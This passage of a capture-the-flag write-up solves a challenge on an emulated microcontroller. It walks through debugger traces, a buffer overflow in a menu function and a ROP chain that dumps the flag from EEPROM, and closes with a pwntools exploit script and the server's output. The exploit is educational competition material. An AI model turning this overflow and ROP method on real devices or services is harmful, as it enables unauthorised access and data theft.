DBG> c
16
=== EEPROM dump (0x800 - 0x1000) ===
 pc = 000BAA  gp0 = 80   gp1 = 00   gp2 = 00   gp3 = 21   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 08
 sp = 1DB3    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = 00  gp15 = 08
flg = 80     gp16 = 00  gp17 = 10  gp18 = 03  gp19 = 02  gp20 = 31  gp21 = 1D  gp22 = 00  gp23 = 02
00000146AD63 gp24 = 25  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = BA  gp29 = 1D  gp30 = 00  gp31 = 02  gp32 = 000000
Breakpoint hit #1
Cycles passed: 50057
DBG> r 7 0
DBG> b t 1
DBG> c
0000: 43 54 46 7B 44 45 42 55  47 5F 4D 4F 44 45 2C 4E  |  CTF{DEBUG_MODE,N
0010: 4F 54 20 41 20 46 4C 41  47 7D 00 00 00 00 00 00  |  OT A FLAG}......
0020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
0090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
00A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
00B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
00C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
00D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
00E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |  ................
```
Now, we're sure that flag is contained in EEPROM at zero address. Unfortunately, when application is put into debug mode: we can only get fake flag `CTF{DEBUG_MODE,NOT A FLAG}`
0xBAA wasn't a great candidate because "address evaluation" function is also used during printing the menu:
```
Please choose mode of operation:
 D - debug session
 C - challenge mode
Choice: D
DBG> b 2986
DBG> c
Menu:
1. Read from EEPROM
2. Magic function
0. Exit
Choice (do not enter more than 5 chars): 
 pc = 000BAA  gp0 = 20   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DDC    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = FA  gp15 = 1D
flg = 20     gp16 = 00  gp17 = 04  gp18 = 03  gp19 = 00  gp20 = EB  gp21 = 1D  gp22 = 00  gp23 = 02
00000001F99E gp24 = 29  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = E3  gp29 = 1D  gp30 = 00  gp31 = 02  gp32 = 000000
```
So we came back to the trace, looking for the "main EEPROM dump function". We were focused on instructions that are executed with high `sp` address (lowest number of elements on call stack) and we've found the next candidate @ 0x466:
```
I|236496,00022C,1DD9,80,80,00,00,00,00,00,00,00,00,00,00,00,44,03,CF,02,FA,1D,DA,00,00,02,00,0A,16,00,00,02,D8,00,D6,1D,001200$
I|236497,00022E,1DDA,80,80,00,00,00,00,00,00,00,00,00,00,00,44,03,CF,02,FA,1D,DA,00,00,02,00,0A,16,00,00,02,12,00,D6,1D,120002$
I|236498,000466,1DDD,80,80,00,00,00,00,00,00,00,00,00,00,00,44,03,CF,02,FA,1D,DA,00,00,02,00,0A,16,00,00,02,12,00,D6,1D,334403$
I|236499,000468,1DDD,80,80,00,00,00,00,00,00,00,00,00,00,00,44,03,CF,02,FA,1D,16,00,00,02,00,0A,16,00,00,02,12,00,D6,1D,334403$
                                                                                                ^^^^^       ^^^^^
                                                                                                count       start
```
By setting appropriate values to the `gp28:gp29` and `gp24:gp25` registers, we could dump EEPROM from chosen starting sector.
The next task was to find a vulnerability that allows to set these registers to the first sector and jump to 0x466 hoping that this will dump the EEPROM part containing the flag.
## 3. Analysing magic function
Fortunately, magic function was vulnerable to the most simple buffer overflow. By inputting a lot of `AAAAAAAAAAAAAAAAAA` we noticed that PC register got changed. Moreover, we could control the stack.
```
 pc = 00022C  gp0 = A0   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DE6    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = FA  gp15 = 1D
flg = A0     gp16 = 00  gp17 = 04  gp18 = 35  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 04
00000002E18E gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = E5  gp29 = 65  gp30 = E1  gp31 = 1D  gp32 = 656565
 pc = 00022E  gp0 = A0   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DE7    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = FA  gp15 = 1D
flg = A0     gp16 = 00  gp17 = 04  gp18 = 35  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 04
00000002E18F gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = 65  gp29 = 65  gp30 = E1  gp31 = 1D  gp32 = 656565
 pc = CACACA  gp0 = A0   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DEA    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = FA  gp15 = 1D
flg = A0     gp16 = 00  gp17 = 04  gp18 = 35  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 04
00000002E190 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = 65  gp29 = 65  gp30 = E1  gp31 = 1D  gp32 = 656565
 pc = 000000  gp0 = A0   gp1 = 00   gp2 = 00   gp3 = 00   gp4 = 00   gp5 = 00   gp6 = 00   gp7 = 00
 sp = 1DEA    gp8 = 00   gp9 = 00  gp10 = 00  gp11 = 00  gp12 = 17  gp13 = 04  gp14 = FA  gp15 = 1D
flg = A0     gp16 = 00  gp17 = 04  gp18 = 35  gp19 = 00  gp20 = 00  gp21 = 02  gp22 = 00  gp23 = 04
00000002E191 gp24 = 00  gp25 = 00  gp26 = 00  gp27 = 02  gp28 = 65  gp29 = 65  gp30 = E1  gp31 = 1D  gp32 = 656565
```
We are controlling the PC (doubled value from stack is loaded to PC) and `gp28:gp29` are already set to the values from stack! Unfortunately, we can't control the section count `gp24:gp25` which is set to zero.
This immediately suggested a ROP chain. We have a good place to jump to (@0x466) but we need to find a gadget that allows to increment `gp24:gp25` value or set to the value fetched from the stack.
With small help from Python we have transformed trace to check how registers are changed by traced instructions.
```
000228 SP 1DDF => 1DE5
       REG 36 0F4242$ => 424242
00022A SP 1DE5 => 1DE6
       REG 33 1D => 42
       REG 36 424242 => 424200
00022C SP 1DE6 => 1DE7
       REG 32 E5 => 42
       REG 36 424200 => 420005
00022E REG 36 420005 => D54142
       RET stack size 0x3
```
This allowed us to easily find gadgets. A gadget @ 0xCCE can be used to overwrite wanted registers.
```
000CCE
        modified REG 28 01 => 59
000CD0
        modified SP 1DB3 => 1DB4
        modified REG 33 00 => 1D
        modified REG 36 5B1DBA => 1DBA1D
000CD2
        modified SP 1DB4 => 1DB5
        modified REG 32 59 => BA
        modified REG 36 1DBA1D => BA1DE2
000CD4
        modified SP 1DB5 => 1DB6
        modified REG 21 02 => 1D
        modified REG 36 BA1DE2 => 1DE200
000CD6
        modified SP 1DB6 => 1DB7
        modified REG 20 00 => E2
        modified REG 36 1DE200 => E20004
000CD8
        modified SP 1DB7 => 1DBA
        modified REG 36 E20004 => 1A065B
        JMP 000CD8 => 000834
```
```
I|208087,000CCE,1DB3,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,00,02,03,00,E2,1D,00,02,0F,00,00,02,57,00,92,00,5B1DBA$
I|208088,000CD0,1DB3,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,00,02,03,00,E2,1D,00,02,57,00,00,02,57,00,92,00,5B1DBA$
I|208089,000CD2,1DB4,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,00,02,03,00,E2,1D,00,02,57,00,00,02,57,1D,92,00,1DBA1D$
I|208090,000CD4,1DB5,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,00,02,03,00,E2,1D,00,02,57,00,00,02,BA,1D,92,00,BA1DE2$
I|208091,000CD6,1DB6,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,00,1D,03,00,E2,1D,00,02,57,00,00,02,BA,1D,92,00,1DE200$
I|208092,000CD8,1DB7,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,E2,1D,03,00,E2,1D,00,02,57,00,00,02,BA,1D,92,00,E20004$
I|208093,000834,1DBA,80,92,00,00,00,00,00,BB,1D,00,00,00,00,00,02,AC,02,E2,1D,03,00,E2,1D,00,02,57,00,00,02,BA,1D,92,00,1A065B$
```
`CCE` instruction moves instruction `gp28 => gp24`. Then `CD0` and `CD2` pops `gp29` and `gp28` from the stack. Finally, gadget returns at 0xCD8 without overwriting crucial registers.
### 4. Joining everything together
Using gadgets found before we have constructed a payload:
```
2\n            # 'magic' function
1\n            # first value
BBBBBB         # padding
\x00\x01       # sector count: 1
\x00\x06\x62   # 0x662 * 2 => 0xCC4
\x00\x00       # starting sector: 0
AA             # padding
\x00\x02\x33\n # 0x233 * 2 => 0x466
```
Finally, we've joined everything together and wrote a simple script that encoded our exploit and decoded the resulting output from server:
```python
from pwn import *
def read_line(r):
    writes = r.readuntil("@W0A")
    print(''.join([chr(int(c if c else "00", 16)) for c in writes.split("@W")]))
def writestr(r, s):
    r.sendline(''.join("@W%02X" % ord(c) for c in s))
r = remote("registers.2020.ctfcompetition.com", 1337)
# Enter the challenge mode
r.recvuntil("&M")
r.sendline("&C")
# Write input
writestr(r, '2\n1\nBBBBBB\x00\x01\x00\x06\x62\x00\x00AA\x00\x02\x33\n')
# Read output
for i in range(8):
    read_line(r)
```
After executing the exploit, we've successfully dumped first EEPROM sector getting a flag!
```
[+] Opening connection to registers.2020.ctfcompetition.com on port 1337: Done
\x00enu:
\x00. Read from EEPROM
\x00. Magic function
\x00. Exit
\x00hoice (do not enter more than 5 chars): Enter Magic component number A and then B:
\x00== EEPROM dump (0x00 - 0x80) ===
\x00000: 43 54 46 7B 72 33 36 31  35 37 33 72 35 39 30 37  |  CTF{r361573r5907
\x00010: 33 37 37 33 72 7D 00 00  00 00 00 00 00 00 00 00  |  3773r}..........
```
Dumped flag: `CTF{r361573r59073773r}`.